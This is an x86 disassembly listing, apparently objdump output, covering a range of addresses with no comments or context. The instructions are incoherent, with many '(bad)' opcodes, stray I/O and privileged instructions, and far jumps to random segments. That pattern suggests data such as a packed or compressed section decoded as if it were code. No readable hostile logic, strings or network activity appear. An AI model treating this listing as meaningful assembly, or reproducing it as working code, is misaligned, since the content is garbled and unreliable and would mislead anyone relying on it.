  416d55:	mov    ebp,DWORD PTR [edi]
  416d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d58:	adc    eax,0x9e84c312
  416d5d:	sbb    BYTE PTR [ebx],0x47
  416d60:	sahf   
  416d61:	push   eax
  416d62:	aas    
  416d63:	js     0x416cfc
  416d65:	iret   
  416d66:	ret    
  416d67:	push   esp
  416d68:	inc    esi
  416d69:	clc    
  416d6a:	and    ah,0x9e
  416d6d:	pop    ss
  416d6e:	mov    esp,edx
  416d70:	and    bl,dl
  416d72:	leave  
  416d73:	jnp    0x416cf7
  416d75:	jb     0x416d3a
  416d77:	in     eax,0x8c
  416d79:	inc    esp
  416d7a:	bound  edi,QWORD PTR [edx+eiz*8-0x76]
  416d7e:	inc    ebx
  416d7f:	sar    DWORD PTR [eax-0x5285ace6],0x5b
  416d86:	ficomp WORD PTR [eax-0xb]
  416d89:	cld    
  416d8a:	test   al,0xd
  416d8c:	sub    BYTE PTR [esi+esi*1-0x4c3267c6],bl
  416d93:	loope  0x416e00
  416d95:	icebp  
  416d96:	ja     0x416d2b
  416d98:	adc    esp,DWORD PTR fs:[ebp+edx*8-0x41]
  416d9d:	dec    ebx
  416d9e:	inc    edx
  416d9f:	inc    edi
  416da0:	sub    BYTE PTR [edx-0x1f],dl
  416da3:	sbb    ecx,DWORD PTR [edx]
  416da5:	push   edi
  416da6:	iret   
  416da7:	xchg   esi,eax
  416da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416da9:	(bad)  
  416daa:	or     al,0x18
  416dac:	push   eax
  416dad:	jns    0x416d6f
  416daf:	and    ebp,edx
  416db1:	xor    ch,BYTE PTR [ebx]
  416db3:	popa   
  416db4:	scas   al,BYTE PTR es:[edi]
  416db5:	adc    eax,0x264eb690
  416dba:	jae    0x416d89
  416dbc:	sbb    ah,BYTE PTR [edx+ebx*2+0x4a]
  416dc0:	xor    bh,BYTE PTR [ebx-0x4a9f16d1]
  416dc6:	mov    dl,0x4b
  416dc8:	or     edi,ebp
  416dca:	add    edx,ebx
  416dcc:	inc    ebx
  416dcd:	inc    ebx
  416dce:	lods   al,BYTE PTR ds:[esi]
  416dcf:	(bad)  
  416dd0:	clc    
  416dd1:	cmc    
  416dd2:	not    BYTE PTR [ebx]
  416dd4:	fiadd  DWORD PTR [eax]
  416dd6:	fist   DWORD PTR [eax-0x2b]
  416dd9:	into   
  416dda:	cwde   
  416ddb:	mov    ah,BYTE PTR [eax]
  416ddd:	mov    BYTE PTR [edx+0x25525c85],bh
  416de3:	into   
  416de4:	mov    cl,0xf4
  416de6:	mov    cl,0xd5
  416de8:	sub    edx,DWORD PTR [eax]
  416dea:	popf   
  416deb:	push   ebp
  416dec:	popa   
  416ded:	sar    BYTE PTR [ebp-0x2bbc9bc4],0x7
  416df4:	xor    al,0xdb
  416df6:	push   ds
  416df7:	push   edi
  416df8:	pop    ebp
  416df9:	in     al,dx
  416dfa:	push   0x5c
  416dfc:	mov    BYTE PTR [eax+0x25790b42],dh
  416e02:	lock (bad) 
  416e04:	cwde   
  416e05:	mov    bh,BYTE PTR [ecx]
  416e07:	xchg   ebp,eax
  416e08:	rol    DWORD PTR [edx],0x6b
  416e0b:	jnp    0x416dfb
  416e0d:	ficom  DWORD PTR [esi+0x14]
  416e10:	xchg   ecx,eax
  416e11:	xchg   ebx,eax
  416e12:	mov    al,0x73
  416e14:	fcmovnu st,st(3)
  416e16:	std    
  416e17:	popf   
  416e18:	dec    ebp
  416e19:	mov    esi,fs
  416e1b:	test   eax,0x822ccb79
  416e20:	push   esi
  416e21:	pop    edi
  416e22:	mov    esp,edx
  416e24:	inc    ecx
  416e25:	push   ecx
  416e26:	in     eax,0x77
  416e28:	and    edi,edi
  416e2a:	into   
  416e2b:	cld    
  416e2c:	mov    edx,0xb35ce6cc
  416e31:	cld    
  416e32:	or     ecx,DWORD PTR [ecx]
  416e34:	cmp    eax,0x426a15b8
  416e39:	into   
  416e3a:	aas    
  416e3b:	sbb    eax,0xae1c1740
  416e40:	repnz leave 
  416e42:	ja     0x416dcd
  416e44:	(bad)  
  416e45:	push   ss
  416e46:	sbb    dl,BYTE PTR [esi+0x42]
  416e49:	or     dh,dh
  416e4b:	xchg   ebp,eax
  416e4c:	push   0x84596611
  416e51:	outs   dx,DWORD PTR ds:[esi]
  416e52:	xor    BYTE PTR [esi],al
  416e54:	xchg   esp,eax
  416e55:	jmp    0xbc6f0bf2
  416e5a:	shr    DWORD PTR [edi+0x5b39aa60],0x4b
  416e61:	mov    ch,0x0
  416e63:	in     eax,0xf9
  416e65:	(bad)  
  416e66:	dec    ebx
  416e67:	sbb    al,0xa6
  416e69:	adc    eax,0x9c4dddc0
  416e6e:	xchg   ebx,eax
  416e6f:	pop    ds
  416e70:	ds or  al,0x5c
  416e73:	retf   
  416e74:	xchg   ebp,eax
  416e75:	jge    0x416e4e
  416e77:	and    ch,BYTE PTR [eax+0xd]
  416e7a:	mov    eax,ds:0xdf036919
  416e7f:	es inc ebp
  416e81:	pushf  
  416e82:	addr16 sbb al,0x6
  416e85:	inc    esp
  416e86:	aam    0x64
  416e88:	jns    0x416e87
  416e8a:	test   eax,0xab997c22
  416e8f:	fild   QWORD PTR [edx+0x10]
  416e92:	mov    cl,al
  416e94:	add    BYTE PTR [esi-0x6b1803b],dl
  416e9a:	cmp    DWORD PTR [eax-0x565c7af4],0xd87e9e4d
  416ea4:	loop   0x416e90
  416ea6:	adc    dl,BYTE PTR [edi-0x1b8ff3c8]
  416eac:	push   ss
  416ead:	add    ch,bl
  416eaf:	mov    ebx,0xf787347
  416eb4:	lahf   
  416eb5:	add    eax,0xa898f11f
  416eba:	arpl   WORD PTR [edi+0x3a],bx
  416ebd:	aas    
  416ebe:	jnp    0x416ed9
  416ec0:	int3   
  416ec1:	jmp    0x8f07:0xbbecea07
  416ec8:	cwde   
  416ec9:	xor    BYTE PTR [ebp-0x15],bl
  416ecc:	imul   ecx,DWORD PTR [ecx+0x40],0x16a8f95d
  416ed3:	sbb    DWORD PTR [ebp-0x51d0e8d1],0xffffff85
  416eda:	mov    ecx,0x38ba273f
  416edf:	scas   al,BYTE PTR es:[edi]
  416ee0:	cmp    BYTE PTR [eax],ah
  416ee2:	out    dx,eax
  416ee3:	outs   dx,DWORD PTR ds:[esi]
  416ee4:	inc    ebp
  416ee5:	sub    eax,0x193cee4b
  416eea:	jb     0x416f3c
  416eec:	add    dl,BYTE PTR [ebp-0x46]
  416eef:	dec    ebx
  416ef0:	mov    dh,bl
  416ef2:	push   ebp
  416ef3:	idiv   BYTE PTR [edx-0x2d2ed884]
  416ef9:	pop    ds
  416efa:	push   ss
  416efb:	xor    ah,bh
  416efd:	mov    ecx,DWORD PTR [ecx-0x6b]
  416f00:	clc    
  416f01:	rol    DWORD PTR [ebx+0x51],0xb
  416f05:	arpl   bx,bx
  416f07:	gs mov ebp,0xb6dd2242
  416f0d:	xchg   edx,eax
  416f0e:	sti    
  416f0f:	mov    dh,0x28
  416f11:	dec    esi
  416f12:	std    
  416f13:	adc    ebp,ecx
  416f15:	push   cs
  416f16:	popa   
  416f17:	dec    ebp
  416f18:	xor    ah,0x95
  416f1b:	rcr    DWORD PTR [ebp-0x1e],0x50
  416f1f:	imul   ecx,ecx,0x31bb4db0
  416f25:	jmp    0x416f4a
  416f27:	sub    bh,BYTE PTR [esi+ecx*4-0x5]
  416f2b:	(bad)  
  416f2c:	cwde   
  416f2d:	xor    eax,0xcf35c93c
  416f32:	sbb    DWORD PTR [ebp-0x2d],eax
  416f35:	or     DWORD PTR [bp+di-0x31],esp
  416f39:	jmp    0x416ecf
  416f3b:	cli    
  416f3c:	and    ecx,DWORD PTR [eax]
  416f3e:	mov    ecx,eax
  416f40:	mov    bl,dh
  416f42:	jb     0x416f23
  416f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f45:	push   edx
  416f46:	mov    bl,BYTE PTR [edx]
  416f48:	inc    esi
  416f49:	add    DWORD PTR [ebp+0x69],edx
  416f4c:	repnz mov esp,DWORD PTR [edx+ebp*2]
  416f50:	into   
  416f51:	call   FWORD PTR [esi+0x59]
  416f54:	add    BYTE PTR [ecx],dh
  416f56:	aam    0x84
  416f58:	xor    DWORD PTR [edx+0x34],esi
  416f5b:	adc    DWORD PTR [ebp+esi*4-0x6acc3d60],0x1f1772da
  416f66:	dec    ebx
  416f68:	lock sbb DWORD PTR [ebx+0x7cf49664],edx
  416f6f:	aaa    
  416f70:	loope  0x416f8d
  416f72:	lods   al,BYTE PTR ds:[esi]
  416f73:	test   ecx,ebp
  416f75:	sub    DWORD PTR [esp+eax*2-0x6d],0xffffff8c
  416f7a:	out    dx,al
  416f7b:	cdq    
  416f7c:	sbb    esi,DWORD PTR [edi]
  416f7e:	xor    dh,BYTE PTR [edi+0x3395ee8b]
  416f84:	push   ss
  416f85:	sbb    DWORD PTR [esp+esi*2+0x6c],eax
  416f89:	mov    WORD PTR [esi-0x532fa725],?
  416f8f:	mov    eax,ds:0x77e8bce1
  416f94:	sbb    BYTE PTR [ebx*8+0x7726c2d5],dh
  416f9b:	mov    esp,DWORD PTR [esi]
  416f9d:	add    DWORD PTR [esi-0x37],ebx
  416fa0:	stc    
  416fa1:	add    eax,0xdd0da35f
  416fa6:	out    dx,al
  416fa7:	or     DWORD PTR [edx+0x6],ebx
  416faa:	adc    eax,0x3ac23561
  416faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fb0:	sahf   
  416fb1:	in     eax,dx
  416fb2:	xchg   esp,eax
  416fb3:	inc    eax
  416fb4:	dec    ebx
  416fb5:	pop    edx
  416fb6:	fwait
  416fb7:	adc    al,0x2e
  416fb9:	xchg   edx,eax
  416fba:	xor    BYTE PTR [esi+0x1a],dh
  416fbd:	mov    ah,0xa2
  416fbf:	stos   DWORD PTR es:[edi],eax
  416fc0:	pusha  
  416fc1:	pop    ss
  416fc2:	or     dl,BYTE PTR [edx+0x1589fcc]
  416fc8:	rcl    BYTE PTR [esi-0x63],1
  416fcb:	push   esi
  416fcc:	or     BYTE PTR ds:0x4717143a,bh
  416fd2:	jbe    0x416f6c
  416fd4:	out    0xbb,eax
  416fd6:	jge    0x416fa0
  416fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fd9:	inc    esp
  416fda:	cdq    
  416fdb:	pop    edx
  416fdc:	pusha  
  416fdd:	dec    edx
  416fde:	inc    esi
  416fdf:	pop    ds
  416fe0:	js     0x416ff5
  416fe2:	sub    al,0x17
  416fe4:	pop    edi
  416fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fe6:	aas    
  416fe7:	jnp    0x416fa1
  416fe9:	mov    eax,ds:0xdc5c910b
  416fee:	pop    esi
  416fef:	mov    bh,0xc
  416ff1:	(bad)  
  416ff2:	mov    al,0x1e
  416ff4:	les    esp,FWORD PTR [ecx-0x2e]
  416ff7:	in     al,0x89
  416ff9:	(bad)  
  416ffa:	sbb    esp,DWORD PTR [edi-0x78488299]
  417000:	jmp    0x417071
  417002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417003:	xchg   edi,eax
  417004:	dec    esi
  417005:	push   esi
  417006:	iret   
  417007:	fwait
  417008:	and    BYTE PTR [ebx+eax*2+0x18b18f7c],bh
  41700f:	mov    WORD PTR [edi],ds
  417011:	shl    DWORD PTR [ebx+eiz*1+0x1e],0xd6
  417016:	mov    WORD PTR [ebx+ebx*2],fs
  417019:	mov    eax,0xb6d79d84
  41701e:	imul   esp,ebp,0x39
  417021:	jl     0x417072
  417023:	test   al,0xd5
  417025:	add    esp,DWORD PTR [esi]
  417027:	mov    eax,DWORD PTR [edx]
  417029:	(bad)  
  41702a:	sbb    DWORD PTR [edi],0xffffff93
  41702d:	mov    al,ds:0x72f299b0
  417032:	xor    eax,0x8a557d8f
  417037:	das    
  417038:	pop    edx
  417039:	xlat   BYTE PTR ds:[ebx]
  41703a:	push   esp
  41703b:	and    ch,BYTE PTR [eax+0x79]
  41703e:	es xchg ebx,eax
  417040:	test   bl,dl
  417042:	pop    ebx
  417043:	add    ch,al
  417045:	aad    0x7f
  417047:	stos   BYTE PTR es:[edi],al
  417048:	test   eax,0x47dbf5d3
  41704d:	push   0xb173c19
  417052:	adc    al,0x93
  417055:	sbb    dh,BYTE PTR [eax-0x4b]
  417058:	ret    0xc784
  41705b:	pop    ds
  41705c:	lods   eax,DWORD PTR ds:[esi]
  41705d:	clc    
  41705e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41705f:	in     al,dx
  417060:	aas    
  417061:	shl    BYTE PTR [eax],0x9b
  417064:	adc    al,0x86
  417066:	sub    DWORD PTR [ecx+0x61],eax
  417069:	fwait
  41706a:	(bad)
  41706d:	fpatan 
  41706f:	aas    
  417070:	fimul  DWORD PTR [esi]
  417072:	subps  xmm7,XMMWORD PTR [ebp+edi*2+0x33]
  417077:	or     dl,cl
  417079:	jl     0x417064
  41707b:	popf   
  41707c:	sub    al,0xc4
  41707e:	pop    ss
  41707f:	test   eax,0x891b4b77
  417084:	pop    ds
  417085:	je     0x417070
  417087:	or     eax,0x98f0ee02
  41708c:	inc    ecx
  41708d:	nop
  41708e:	stos   BYTE PTR es:[edi],al
  41708f:	scas   al,BYTE PTR es:[edi]
  417090:	bnd jl 0x41707c
  417093:	mov    gs,WORD PTR [edi]
  417095:	push   ds
  417096:	adc    al,0x0
  417098:	jbe    0x417027
  41709a:	pop    edx
  41709b:	mov    esp,0xef485b25
  4170a0:	arpl   WORD PTR [edi-0x74],bp
  4170a3:	sub    esp,DWORD PTR [ecx+ebx*2-0x31]
  4170a7:	clc    
  4170a8:	(bad)  
  4170a9:	jecxz  0x4170a1
  4170ab:	inc    bx
  4170ad:	sub    DWORD PTR [edx+0x63d1d6f0],ecx
  4170b3:	push   ds
  4170b4:	call   0x6bd0e7fe
  4170b9:	add    dh,BYTE PTR [edi-0x57]
  4170bc:	icebp  
  4170bd:	jnp    0x417078
  4170bf:	pop    eax
  4170c0:	xchg   ebp,eax
  4170c1:	(bad)  
  4170c2:	push   edi
  4170c3:	cmp    al,0x91
  4170c5:	or     al,0xd8
  4170c7:	and    BYTE PTR [eax+0x381d90e9],dh
  4170cd:	sbb    al,al
  4170cf:	mov    ecx,0xc0f90281
  4170d4:	out    0xe3,al
  4170d6:	dec    ebx
  4170d7:	mov    ch,0x4c
  4170d9:	enter  0x2d2d,0xcc
  4170dd:	pop    ebp
  4170de:	sub    DWORD PTR ds:0xefa2731e,0xa618ee42
  4170e8:	xor    DWORD PTR [eax+0x6a7e41f],0x1ea9dc5b
  4170f2:	je     0x4170b4
  4170f4:	inc    esp
  4170f5:	mov    eax,DWORD PTR [edi]
  4170f7:	jae    0x417142
  4170f9:	cmp    ah,dl
  4170fb:	jecxz  0x41713c
  4170fd:	push   ebp
  4170fe:	inc    esp
  4170ff:	jle    0x4170fb
  417101:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  417103:	jae    0x41708a
  417105:	or     BYTE PTR [ebx+0x6cbe70f6],dh
  41710b:	call   0xe9e42707
  417110:	mov    WORD PTR [eax-0x4c69ec24],es
  417116:	outs   dx,DWORD PTR ds:[esi]
  417117:	sub    al,0xe6
  417119:	inc    ecx
  41711a:	stos   DWORD PTR es:[edi],eax
  41711b:	mov    ebx,ebx
  41711d:	aam    0x37
  41711f:	mov    ds:0x92fa3ce9,eax
  417124:	sahf   
  417125:	nop
  417126:	nop
  417127:	fdiv   st(0),st
  417129:	lods   al,BYTE PTR ds:[esi]
  41712a:	imul   DWORD PTR [edi+0x5d]
  41712d:	push   cs
  41712e:	ins    BYTE PTR es:[edi],dx
  41712f:	push   eax
  417130:	and    al,0x66
  417132:	push   ecx
  417133:	mov    ecx,0xb56faa8
  417138:	sti    
  417139:	shl    DWORD PTR [ecx],0x20
  41713c:	mov    edx,0xe99a3110
  417141:	cmp    eax,0xe98c106b
  417146:	xor    al,0xbe
  417148:	jmp    0x84f2:0x9af186a5
  41714f:	cs inc esp
  417151:	test   DWORD PTR [ebp+0x79],ebx
  417154:	test   BYTE PTR [ecx-0x197122ce],cl
  41715a:	lods   al,BYTE PTR ds:[esi]
  41715b:	lods   al,BYTE PTR ds:[esi]
  41715c:	ror    DWORD PTR [edi],1
  41715e:	adc    dh,dh
  417160:	hlt    
  417161:	ds mov eax,DWORD PTR gs:[edi-0x672ec512]
  417169:	sbb    ah,BYTE PTR [ebx+esi*2]
  41716c:	out    0x96,al
  41716e:	jnp    0x4171c1
  417170:	mov    WORD PTR [ebp+0x78],ds
  417173:	js     0x417142
  417175:	mov    WORD PTR [esi],ss
  417177:	(bad)  
  417178:	hlt    
  417179:	sub    edi,0x785ae6c8
  41717f:	pop    esi
  417180:	xlat   BYTE PTR ds:[ebx]
  417181:	shl    ecx,cl
  417183:	push   0xfffffff2
  417185:	(bad)  [ebx]
  417187:	aas    
  417188:	sbb    ch,BYTE PTR [ecx-0x3e]
  41718b:	dec    esi
  41718c:	shrd   esp,esi,0xd7
  417190:	xor    ah,0x48
  417193:	inc    esi
  417194:	or     cl,BYTE PTR [edx+0x70]
  417197:	fdivr  DWORD PTR [ebp-0xb5b1a88]
  41719d:	or     DWORD PTR ds:0xdddc1e2b,esp
  4171a3:	or     ebp,ecx
  4171a5:	xchg   esp,eax
  4171a6:	pop    ebx
  4171a7:	adc    DWORD PTR [ebx-0x3a],ecx
  4171aa:	pop    edi
  4171ab:	mov    eax,0xc301a4e2
  4171b0:	(bad)  
  4171b1:	cld    
  4171b2:	or     BYTE PTR [edi+0x7d8bee63],0x77
  4171b9:	inc    ecx
  4171ba:	nop
  4171bb:	jae    0x417226
  4171bd:	cmp    DWORD PTR [ebx-0x23ab56dd],eax
  4171c3:	shr    DWORD PTR [esi-0x62],cl
  4171c6:	je     0x417207
  4171c8:	scas   eax,DWORD PTR es:[edi]
  4171c9:	ss cmp eax,0x9d9cbcdc
  4171cf:	jge    0x417177
  4171d1:	sbb    ebp,ecx
  4171d3:	jb     0x4171e9
  4171d5:	pop    es
  4171d6:	xor    edi,DWORD PTR [eax]
  4171d8:	pop    es
  4171d9:	sub    ecx,ebx
  4171db:	xchg   esp,eax
  4171dc:	test   eax,0xe6a6a86b
  4171e1:	push   edi
  4171e2:	clc    
  4171e3:	std    
  4171e4:	and    al,0x6
  4171e6:	nop
  4171e7:	xor    eax,0x8d3cc9cb
  4171ec:	outs   dx,DWORD PTR ds:[esi]
  4171ed:	into   
  4171ee:	fadd   QWORD PTR [eax]
  4171f0:	leave  
  4171f1:	neg    DWORD PTR ss:[esi+0x40]
  4171f5:	and    eax,0xd4cc59d
  4171fa:	pop    esp
  4171fb:	gs call 0x6657:0x649b6bbf
  417203:	std    
  417204:	jmp    0xd00a:0xcfce042b
  41720b:	sub    bh,bl
  41720d:	jmp    0x41723b
  41720f:	aaa    
  417210:	(bad)  [edx+ebp*4-0x6620ad5b]
  417217:	test   ah,bl
  417219:	test   al,0x47
  41721b:	add    BYTE PTR [edi-0x65],dh
  41721e:	loop   0x41724d
  417220:	scas   eax,DWORD PTR es:[edi]
  417221:	sbb    BYTE PTR [edx+0x29a043a9],dl
  417227:	or     eax,0x8c379063
  41722c:	rcr    BYTE PTR [ebp+0x342e663a],cl
  417232:	jge    0x417257
  417234:	cmp    DWORD PTR [esi+edi*8+0x5c],ebp
  417238:	cmp    dl,bh
  41723a:	cwde   
  41723b:	jnp    0x520e9497
  417241:	dec    edi
  417242:	test   DWORD PTR [edi-0x1222c4c6],0xa3909b6b
  41724c:	xor    di,bp
  41724f:	(bad)  
  417251:	loope  0x41726f
  417253:	test   al,0x97
  417255:	xchg   ebp,eax
  417256:	pop    eax
  417257:	dec    edx
  417258:	mov    eax,ds:0xebba4ef1
  41725d:	fs test al,0x7a
  417260:	jne    0x4172b9
  417262:	pop    edx
  417263:	jmp    0x4171e5
  417265:	aam    0x28
  417267:	inc    ebx
  417268:	dec    ebx
  417269:	leave  
  41726a:	xor    al,0xa6
  41726c:	repz out 0x68,al
  41726f:	sub    BYTE PTR [edx+0x378a37db],0xfd
  417276:	in     al,0xb3
  417278:	mov    ecx,0x5f8a4c6c
  41727d:	pop    esp
  41727e:	jnp    0x417254
  417280:	mov    ecx,0xbce7ca35
  417285:	jmp    0x2499:0xb2bde315
  41728c:	in     al,dx
  41728d:	mov    edi,0x92b7b0be
  417292:	mov    ds:0x9802c5c5,al
  417297:	pop    esp
  417298:	std    
  417299:	arpl   WORD PTR [ebp-0x16692364],bx
  41729f:	loope  0x4172dc
  4172a1:	add    al,0xb5
  4172a3:	test   eax,0xe4ee333d
  4172a8:	(bad)  
  4172a9:	imul   ebx,DWORD PTR [ebx],0xcf6e6d39
  4172af:	ins    BYTE PTR es:[edi],dx
  4172b0:	data16 cmp al,0x1c
  4172b3:	push   cs
  4172b4:	push   es
  4172b5:	imul   edx,DWORD PTR [esi],0xfffffff2
  4172b8:	add    DWORD PTR [ecx],ebp
  4172ba:	shr    BYTE PTR [esi],1
  4172bc:	add    eax,0xf2c2ff98
  4172c1:	aam    0x42
  4172c3:	aad    0xc1
  4172c5:	div    BYTE PTR [eax-0x22600756]
  4172cb:	mov    al,ds:0x4313e93d
  4172d0:	sbb    ecx,DWORD PTR [eax+0x6363b2e3]
  4172d6:	test   eax,0x261ec249
  4172db:	not    BYTE PTR [ebx-0x77]
  4172de:	ret    0x2194
  4172e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172e2:	adc    esp,DWORD PTR ds:0x2b718e37
  4172e8:	pop    esi
  4172e9:	inc    ebp
  4172ea:	pop    eax
  4172eb:	inc    ebp
  4172ec:	aaa    
  4172ed:	adc    al,BYTE PTR [esp+ebx*1]
  4172f0:	push   esp
  4172f1:	cmp    esi,0x42
  4172f4:	clc    
  4172f5:	rcl    BYTE PTR ds:0xfb189ff2,cl
  4172fb:	jnp    0x417344
  4172fd:	cmp    ch,BYTE PTR [ebp+0xa87ef7c]
  417303:	nop
  417304:	jnp    0x41730c
  417306:	mov    bl,0xeb
  417308:	mov    ebx,0xd02f7f0e
  41730d:	inc    esi
  41730e:	aam    0x61
  417310:	inc    ebx
  417311:	leave  
  417312:	adc    cl,0xec
  417315:	fnstenv [esi]
  417317:	test   BYTE PTR ds:0x30dadfc2,cl
  41731d:	pusha  
  41731e:	adc    bl,BYTE PTR [ebx]
  417320:	sbb    eax,0xd1ad356f
  417325:	inc    edx
  417326:	gs or  al,0x15
  417329:	push   0xffffffdb
  41732b:	sub    BYTE PTR [edx-0x7ae65d9b],ch
  417331:	mov    ah,0x88
  417333:	repnz (bad) 
  417335:	gs push ebp
  417337:	loope  0x4173a0
  417339:	in     al,dx
  41733a:	jle    0x4172d4
  41733c:	not    BYTE PTR [eax+0x67]
  41733f:	retf   0x8ec4
  417342:	aaa    
  417343:	pop    ecx
  417344:	mov    dl,0x60
  417346:	cdq    
  417347:	xor    dl,BYTE PTR [edx]
  417349:	and    al,0x75
  41734b:	in     al,dx
  41734c:	add    esi,DWORD PTR [edx+0x26]
  41734f:	or     BYTE PTR [ebp-0x264a540d],bl
  417355:	push   ebp
  417356:	add    edi,ebp
  417358:	sbb    BYTE PTR [eax-0x6ec6030],cl
  41735e:	inc    edi
  41735f:	mov    WORD PTR [ebp+0x4d],ds
  417362:	pop    esp
  417363:	push   ecx
  417364:	pop    esp
  417365:	jecxz  0x4173d3
  417367:	sub    ch,ch
  417369:	xchg   ebx,eax
  41736a:	je     0x4172f2
  41736c:	icebp  
  41736d:	(bad)  
  41736e:	imul   edx,DWORD PTR [ecx],0xa285d16c
  417374:	jecxz  0x4172fd
  417376:	loopne 0x417323
  417378:	push   es
  417379:	jne    0x41737a
  41737b:	out    0xd6,eax
  41737d:	sbb    DWORD PTR [ebp+0x2005e17f],edi
  417383:	add    DWORD PTR [eax*2-0x4fe93e1],esp
  41738a:	int3   
  41738b:	ja     0x417371
  41738d:	jne    0x4173ba
  41738f:	xchg   esp,eax
  417390:	xor    eax,esp
  417392:	cdq    
  417393:	xor    eax,0xbec8e73a
  417398:	push   cs
  417399:	push   eax
  41739a:	(bad)  
  41739b:	ins    BYTE PTR es:[edi],dx
  41739c:	pushf  
  41739d:	add    BYTE PTR [ecx+0x53e5c695],ch
  4173a3:	mov    ch,0x9b
  4173a5:	adc    DWORD PTR es:[eax+0x135d1ce4],ecx
  4173ac:	call   0x5cad55d2
  4173b1:	ds es fst st(1)
  4173b5:	fild   QWORD PTR [esi-0x1377c39e]
  4173bb:	retf   0xfac2
  4173be:	xor    esp,DWORD PTR [ebx-0x2f]
  4173c1:	sbb    eax,0x1d06d72e
  4173c6:	outs   dx,DWORD PTR ds:[esi]
  4173c7:	mov    ss,WORD PTR [esi+0x3c]
  4173ca:	and    esp,DWORD PTR [ebx+0x6f]
  4173cd:	(bad)  
  4173ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173cf:	sub    dl,0x24
  4173d2:	(bad)  
  4173d3:	int3   
  4173d4:	pop    edx
  4173d5:	loopne 0x417379
  4173d7:	adc    al,0x6a
  4173d9:	xchg   esi,eax
  4173da:	xchg   ebp,eax
  4173db:	daa    
  4173dc:	push   ebx
  4173dd:	and    BYTE PTR [ebp+0x48],0x70
  4173e1:	mov    esi,0x295d7ce1
  4173e6:	rcl    DWORD PTR [ebp-0x65],cl
  4173e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173ea:	push   0x49dd8c89
  4173ef:	inc    edx
  4173f0:	sub    DWORD PTR [ebp-0x1954a74b],0x21
  4173f7:	ins    BYTE PTR es:[edi],dx
  4173f8:	adc    DWORD PTR [ecx],esi
  4173fa:	out    dx,eax
  4173fb:	cld    
  4173fc:	scas   al,BYTE PTR es:[edi]
  4173fd:	pop    es
  4173fe:	or     eax,0x3ad643b0
  417403:	jg     0x4173fd
  417405:	icebp  
  417406:	mov    eax,0x3885fa32
  41740b:	and    DWORD PTR [edx-0x73],eax
  41740e:	stc    
  41740f:	mov    ch,0x89
  417411:	outs   dx,BYTE PTR ss:[esi]
  417413:	imul   ebp,DWORD PTR [esi-0x6d52b6de],0xffffff9e
  41741a:	sub    dh,BYTE PTR [edx-0x1f137083]
  417420:	mov    ebp,DWORD PTR [ebp-0x1226c2f2]
  417426:	pop    esi
  417427:	call   0xdf869d63
  41742c:	inc    eax
  41742d:	scas   al,BYTE PTR es:[edi]
  41742e:	cmp    BYTE PTR ds:0x6b28a316,al
  417434:	int3   
  417435:	data16 data16 fsubr DWORD PTR [bp+di-0x4e]
  41743b:	mov    esp,0x5895e259
  417440:	and    ecx,DWORD PTR [ecx-0x1c]
  417443:	in     eax,dx
  417444:	inc    ebx
  417445:	gs int 0x60
  417448:	das    
  417449:	mov    edx,DWORD PTR [edi+ebp*4+0x5d57584c]
  417450:	mov    al,0x9e
  417452:	cld    
  417453:	scas   eax,DWORD PTR es:[edi]
  417454:	test   al,0xe7
  417456:	mov    cl,0xaf
  417458:	mov    BYTE PTR [esi+0x2099a8f2],ah
  41745e:	(bad)  
  41745f:	test   eax,0xaaf1c763
  417464:	jo     0x4173ff
  417466:	xor    bl,al
  417468:	jge    0x417402
  41746a:	inc    edx
  41746b:	ja     0x4174dd
  41746d:	hlt    
  41746e:	xor    BYTE PTR [eax],ch
  417470:	std    
  417471:	popa   
  417472:	shl    DWORD PTR [edx-0x5f],1
  417475:	out    0xb9,al
  417477:	pushf  
  417478:	pop    es
  417479:	adc    ah,BYTE PTR [ebp-0x17fbbdf2]
  41747f:	sbb    eax,DWORD PTR [eax+0xf]
  417482:	mov    ds:0x302eb352,al
  417487:	xchg   ebx,eax
  417488:	push   0x27eaa40c
  41748d:	popa   
  41748e:	and    DWORD PTR [eax+0x6],ecx
  417491:	jmp    0xec9:0x86e79570
  417498:	rcl    DWORD PTR [edx+0x4af88f3],1
  41749e:	push   ebp
  41749f:	iret   
  4174a0:	jns    0x4174c6
  4174a2:	lock das 
  4174a4:	test   BYTE PTR [esi+0x74c04f84],bl
  4174aa:	push   0x2a
  4174ac:	xlat   BYTE PTR ds:[ebx]
  4174ad:	lock loope 0x41752f
  4174b0:	jle    0x4174d6
  4174b2:	push   cs
  4174b3:	popf   
  4174b4:	mov    ds:0x46f702fc,eax
  4174b9:	(bad)  
  4174bb:	cmp    eax,0xbeecbe3c
  4174c0:	arpl   WORD PTR [eax-0x2ae82ff2],di
  4174c6:	mov    cl,0x1d
  4174c8:	jl     0x41744c
  4174ca:	out    0x73,eax
  4174cc:	(bad)  
  4174cd:	adc    bh,dh
  4174cf:	dec    esi
  4174d0:	inc    ebx
  4174d1:	push   DWORD PTR ds:0x75d08eaf
  4174d7:	pusha  
  4174d8:	fsubr  DWORD PTR [eax+0x62]
  4174db:	inc    ecx
  4174dc:	or     eax,0xee2b8bb2
  4174e1:	std    
  4174e2:	xchg   edx,eax
  4174e3:	inc    edi
  4174e4:	pop    es
  4174e5:	mov    esi,fs
  4174e7:	rol    DWORD PTR [eax-0xcf1f78e],1
  4174ed:	jnp    0x4174de
  4174ef:	int    0x5c
  4174f1:	(bad)  [ebp-0x3c]
  4174f4:	xor    eax,0x7dd8f9a9
  4174f9:	nop
  4174fa:	inc    edi
  4174fb:	dec    eax
  4174fc:	mov    edx,0x8a5ffee4
  417501:	(bad)  
  417502:	mov    edx,0xceba5eb4
  417507:	aad    0x74
  417509:	mov    edx,0x4467436
  41750e:	icebp  
  41750f:	cli    
  417510:	retf   0x5baa
  417513:	sbb    eax,0x1cc4ab01
  417518:	cs pop edx
  41751a:	cmp    dh,dh
  41751c:	xlat   BYTE PTR ds:[ebx]
  41751d:	pop    ebp
  41751e:	and    eax,0x55758f62
